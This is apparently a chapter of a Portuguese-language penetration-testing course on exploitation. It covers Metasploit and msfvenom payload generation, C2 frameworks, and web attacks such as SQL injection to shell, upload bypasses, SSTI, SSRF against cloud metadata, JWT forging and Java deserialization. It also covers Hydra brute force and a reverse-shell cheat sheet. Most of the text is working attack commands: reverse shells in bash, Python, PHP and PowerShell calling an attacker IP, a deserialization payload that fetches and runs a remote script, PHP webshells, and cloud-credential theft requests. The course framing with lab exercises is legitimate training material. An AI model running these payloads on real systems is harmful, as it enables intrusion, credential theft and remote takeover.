# 06 · Exploração (Exploitation)

> [← Anterior: Análise de Vulns](../05-analise-vulns/README.md) · [Voltar ao índice](../../README.md) · [Próximo: Pós-Exploração →](../07-pos-exploracao/README.md)

---

## Princípio

Transformar vulnerabilidades confirmadas em **acesso, dados ou execução de código**. **Sempre** dentro do escopo autorizado.

---

## 1. Metasploit Framework — o canivete suíço

### Comandos essenciais

```bash
msfconsole -q                     # inicia sem banner
search <termo>                    # busca exploits/CVEs
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 192.0.2.10
set LHOST 192.0.2.100
set LPORT 4444
run                               # ou exploit
```

### Organização interna

```
exploit/     → exploração ativa
auxiliary/   → scanners, fuzzers, DoS, brute force
post/        → módulos pós-exploração
payload/     → shellcodes
encoder/     → evasão de antivírus
evasion/     → bypass de defesas
```

### Gerar payloads com msfvenom

```bash
# Reverse shell Linux x64
msfvenom -p linux/x64/shell_reverse_tcp LHOST=SEU_IP LPORT=4444 -f elf -o shell.elf

# Meterpreter Windows
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=SEU_IP LPORT=443 -f exe -o payload.exe

# Web shells
msfvenom -p php/meterpreter_reverse_tcp LHOST=... LPORT=... -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=... LPORT=... -f raw -o shell.jsp

# Listar tudo
msfvenom --list payloads | grep reverse
```

### Handlers

```bash
msfconsole -q -x "use exploit/multi/handler; \
  set PAYLOAD windows/x64/meterpreter/reverse_https; \
  set LHOST tun0; set LPORT 443; run"
```

### Meterpreter — comandos úteis

```
sysinfo           # info do alvo
getuid            # usuário atual
ps                # processos
migrate <PID>     # migra para outro processo
hashdump          # hashes SAM (Windows)
screenshot        # captura de tela
keyscan_start     # keylogger
shell             # drop para shell nativo
download <arq>    # baixa arquivo
upload <arq>      # envia arquivo
portfwd add -l 3306 -p 3306 -r 10.0.0.5   # port forward
route add 10.0.0.0/24 2                   # pivoting
```

---

## 2. Frameworks C2 Modernos

| Ferramenta | Licença | Destaque |
|---|---|---|
| **Sliver** (BishopFox) | Open-source | Go, implants mTLS/WireGuard/HTTP(S)/DNS |
| **Mythic** | Open-source | Docker, agents em múltiplas linguagens |
| **Havoc** | Open-source | Interface moderna, pós-ex focada |
| **Cobalt Strike** | Comercial (~$6k/ano) | Padrão da indústria |
| **Covenant** | Open-source | .NET, antigo mas didático |

### Sliver — exemplo de uso

```bash
# Instalação
curl https://sliver.sh/install | sudo bash

# Servidor
sliver-server

# Cliente (em outro terminal)
sliver

# Dentro do cliente:
generate --mtls 192.0.2.100:4443 --os windows --save /tmp/implant.exe
mtls -L 192.0.2.100 -l 4443
# (envie implant.exe ao alvo)
sessions
use <session-id>
```

---

## 3. Exploração Web Direta

### SQLi → Shell no servidor

```bash
# Após confirmar SQLi com SQLMap
sqlmap -u "https://alvo.com.br/product?id=1" --os-shell

# Ou escrever webshell
sqlmap -u "..." --file-write=shell.php --file-dest=/var/www/html/up/x.php
```

### File Upload → RCE

Técnicas clássicas de bypass:

| Filtro | Bypass |
|---|---|
| Extensão `.php` | `.php5`, `.phtml`, `.phar`, `.pht` |
| Content-Type | Alterar para `image/jpeg` mantendo o conteúdo PHP |
| Magic bytes | Prefixar o arquivo com `GIF89a;\n<?php ...` |
| Double extension | `shell.php.jpg` (depende de config do Apache) |
| Null byte (PHP < 5.3) | `shell.php%00.jpg` |
| `.htaccess` upload | Upar `.htaccess` que faz parser de `.jpg` como PHP |

Webshells prontos:
- **p0wny-shell** — single-file PHP, interface web
- **WSO** — feature-rich (pesado)
- **Weevely** — weevely com sessão client-side

```bash
weevely generate senha123 shell.php
# após upload:
weevely https://alvo.com.br/uploads/shell.php senha123
```

### SSTI → RCE

Payloads de teste por engine:

| Engine | Detecção | RCE |
|---|---|---|
| Jinja2 (Python) | `{{7*7}}` = 49 | `{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}` |
| Twig (PHP) | `{{7*'7'}}` = 49 | `{{['id']|filter('system')}}` |
| ERB (Ruby) | `<%= 7*7 %>` = 49 | `<%= \`id\` %>` |
| Smarty (PHP) | `{7*7}` = 49 | `{system('id')}` |
| Freemarker (Java) | `${7*7}` = 49 | Ver [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) |

Automatizado: `tplmap -u "..." --os-shell`.

### SSRF → Cloud Metadata

```bash
# AWS EC2 (IMDSv1)
curl "http://alvo.com.br/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# AWS IMDSv2 (exige token — SSRF mais complexa)
# GCP
curl "http://alvo.com.br/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
     -H "Metadata-Flavor: Google"

# Azure
curl "http://alvo.com.br/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

### JWT Forging

Após descobrir a secret (via `jwt_tool -C`), forje qualquer token:

```bash
jwt_tool <token-original> -T
# edita claims: role=admin, sub=user1, etc.
# escolhe "Sign with secret"
```

### Desserialização Java → RCE

```bash
java -jar ysoserial.jar CommonsCollections5 "curl http://SEU_IP/exec.sh|sh" > payload.bin

# Envia payload no cookie/header/body que a app desserializa
curl https://alvo.com.br/api --data-binary @payload.bin
```

---

## 4. Brute Force e Credential Stuffing

### Hydra

```bash
# SSH
hydra -l admin -P rockyou.txt ssh://alvo.com.br

# HTTP POST form
hydra -L users.txt -P passwords.txt alvo.com.br \
  http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# HTTP basic auth
hydra -L users.txt -P passwords.txt alvo.com.br http-get /admin

# RDP
hydra -l administrator -P passwords.txt rdp://alvo.com.br

# FTP
hydra -l anonymous -p '' ftp://alvo.com.br
```

Cuidado com rate limiting e lockout. Em engagement real, rode **devagar** (`-t 4`).

### Medusa

Alternativa, similar em sintaxe.

```bash
medusa -h alvo.com.br -U users.txt -P passwords.txt -M ssh
```

### Patator

Modular em Python, mais flexível para cenários complexos.

```bash
patator http_fuzz url=https://alvo.com.br/login method=POST \
  body='user=COMBO00&pass=COMBO01' 0=combos.txt \
  -x ignore:fgrep='Invalid credentials'
```

### CeWL — wordlist a partir do site alvo

```bash
cewl https://alvo.com.br -d 3 -m 5 -w wordlist.txt
```

### Mentalist / CUPP — wordlist por perfil pessoal

Entradas: nome, aniversário, filhos, pet... Saída: 100k+ senhas prováveis.

---

## 5. Exploit DBs e Busca de PoC

| Fonte | Link |
|---|---|
| **Exploit-DB** | https://www.exploit-db.com |
| **GitHub (search)** | `CVE-2024-1234 PoC` |
| **PacketStorm** | https://packetstormsecurity.com |
| **NVD** | https://nvd.nist.gov |

```bash
# searchsploit (cache local do Exploit-DB)
searchsploit apache 2.4.49
searchsploit -x linux/remote/50383.py   # examina
searchsploit -m 50383                    # copia para diretório atual
```

---

## 6. Geração de Reverse Shells Rápidas

Cheatsheet essencial. Guarde estes na memória ou em snippet.

### Bash

```bash
bash -i >& /dev/tcp/SEU_IP/4444 0>&1
```

### Python

```python
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("SEU_IP",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

### PHP (num site PHP)

```php
<?php system($_GET['c']); ?>
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/SEU_IP/4444 0>&1'"); ?>
```

### PowerShell

```powershell
powershell -c "$c=New-Object Net.Sockets.TCPClient('SEU_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1 | Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)}"
```

### Receiver (em todos os casos)

```bash
# Netcat tradicional
nc -lvnp 4444

# Melhor: pwncat-cs (auto-estabiliza TTY)
pipx install pwncat-cs
pwncat-cs -l 4444
```

Referência completa: [revshells.com](https://www.revshells.com).

### Upgrade de shell (TTY estável)

```bash
# Dentro da shell obtida:
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Depois no seu terminal (Ctrl+Z para pausar):
stty raw -echo; fg

# De volta na shell:
export TERM=xterm-256color
stty rows 40 columns 120
```

---

## Exercícios

1. No **TryHackMe** (sala "Blue" ou "Metasploit Introduction"), explore a vulnerabilidade proposta com o MSF.
2. No DVWA (nível medium), bypasse a validação de upload e consiga RCE com um webshell PHP.
3. Gere uma reverse shell com `msfvenom`, inicie um handler, execute num ambiente de teste (sua VM) e documente cada passo.

---

[← Anterior: Análise de Vulns](../05-analise-vulns/README.md) · [Voltar ao índice](../../README.md) · [Próximo: Pós-Exploração →](../07-pos-exploracao/README.md)
